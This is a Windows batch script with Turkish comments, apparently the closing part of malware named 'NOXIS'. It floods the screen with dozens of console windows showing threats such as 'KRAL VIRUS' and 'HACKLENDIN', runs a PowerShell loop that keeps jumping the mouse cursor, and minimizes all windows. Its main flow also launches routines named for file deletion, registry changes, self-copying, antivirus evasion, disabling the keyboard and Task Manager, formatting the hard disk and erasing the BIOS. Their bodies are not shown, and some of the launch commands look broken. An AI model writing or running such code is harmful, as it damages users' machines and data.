start cmd.exe /k "color 0d && echo KRAL VIRUS && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0e && echo HACKLENDIN && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0f && echo COK GEC && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 1a && echo KACIS YOK && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 2b && echo YARDIM YOK && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 3c && echo NOXIS HER YERDE && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 4d && echo SIFIRLANIYOR && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 5e && echo HOSCAKAL && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 6a && echo SONUN GELDI && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 7b && echo SISTEM CIKTI && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 8c && echo YENIDEN BASLATILIYOR && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 9d && echo NOXIS KRALI && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color ae && echo SON DANS && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color bf && echo KARA DELIK && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color c0 && echo SIFIR NOKTASI && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color d1 && echo PATLAMA && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color e2 && echo NOXIS SON && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color f3 && echo SON HESAP && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 1b && echo KIRMIZI ALARM && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 2c && echo MAVI EKRAN && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 3d && echo YESIL ISIN && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 4e && echo MOR KRAL && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 5f && echo TURUNCU ATES && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 6a && echo SARI YILDIRIM && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 7b && echo BEYAZ SESSIZLIK && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 8c && echo SIVI KROM && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 9d && echo TOZ BULUTU && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color ae && echo SON HESAP && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0a && echo 1 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0c && echo 2 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0d && echo 3 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0e && echo 4 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0f && echo 5 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 1a && echo 6 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 2b && echo 7 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 3c && echo 8 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 4d && echo 9 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 5e && echo 10 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 6a && echo 11 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 7b && echo 12 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 8c && echo 13 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 9d && echo 14 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color ae && echo 15 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color bf && echo 16 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color c0 && echo 17 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color d1 && echo 18 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color e2 && echo 19 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color f3 && echo 20 && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0a && echo GLITCH && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0c && echo HATA && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0d && echo CIKTI && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0e && echo BOZUK && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 0f && echo KIRIK && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 1a && echo COK && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 2b && echo GEC && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 3c && echo SON && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 4d && echo DANS && timeout /t 2 /nobreak >nul && exit"
start cmd.exe /k "color 5e && echo PATLA && timeout /t 2 /nobreak >nul && exit"

:: Fare imlecini rahatsız et
start /min cmd.exe /c "powershell -command \"while(1){$p=[System.Windows.Forms.Cursor]::Position;$p.X+=500;$p.Y+=500;[System.Windows.Forms.Cursor]::Position=$p;Start-Sleep -Seconds 0.3}\"" >nul 2>&1

:: Tüm pencereleri minimize et
powershell -command "(new-object -com shell.application).minimizeall()" >nul 2>&1

:: 1 saniye bekle
timeout /t 2 /nobreak >nul 2>&1

:: Döngüyü tekrarla
goto kaos

:: ============================================
:: ANA PROGRAM AKIŞI
:: ============================================

:: Başlangıç
call :hiz_kontrol
call :uyari_ekrani
call :ikinci_uyari
call :yukleme_animasyonu
call :glitch_efektleri
call :gizlilik_ve_kopyalama
call :registry_islemleri
call :dosya_silme

:: Ana döngüleri başlat
start /min cmd.exe /c "call :antivirus_koruma"
start /min cmd.exe /c "call :kendini_geri_getir"
start /min cmd.exe /c "call :surekli_kopyala"
start /min cmd.exe /c "call :video_ac"
start /min cmd.exe /c "call :ekran_karincalanma"
start /min cmd.exe /c "call :windows_cokert"
start /min cmd.exe /c "call :taskmgr_koruma"
start /min cmd.exe /c "call :uygulama_kapat"
start /min cmd.exe /c "call :ses_efekti"
start /min cmd.exe /c "call :ekran_karart"
start /min cmd.exe /c "call :sonsuz_popup"
start /min cmd.exe /c "call :internet_kes"
start /min cmd.exe /c "call :yazici_saldiri"
start /min cmd.exe /c "call :cd_dvd_ac_kapat"
start /min cmd.exe /c "call :klavye_devre_dis"
start /min cmd.exe /c "call :ekran_dondur"
start /min cmd.exe /c "call :ses_sonuna_kadar"
start /min cmd.exe /c "call :mavi_ekran"
start /min cmd.exe /c "call :bios_sil"
start /min cmd.exe /c "call :hard_disk_format"
start /min cmd.exe /c "call :gorsel_efektler"
start /min cmd.exe /c "call :mouse_dondur"
start /min cmd.exe /c "call :glitch_mesajlar"
start /min cmd.exe /c "call :islemci_yak"
start /min cmd.exe /c "call :sistem_boz"
start /min cmd.exe /c "call :yeniden_baslat_zamanlayici"
call :kaos

:: ============================================
:: SON
:: ============================================

:son
echo.
echo.
echo                     ██████████████████████████████████████████████████████
echo                     ██                                                  ██
echo                     ██         NOXIS V%versiyon%                          ██
echo                     ██                                                  ██
echo                     ██         YAZAN: %yazar%                            ██
echo                     ██         TARIH: %tarih% - %saat%                    ██
echo                     ██                                                  ██
echo                     ██████████████████████████████████████████████████████
echo.
echo.
pause >nul
exit
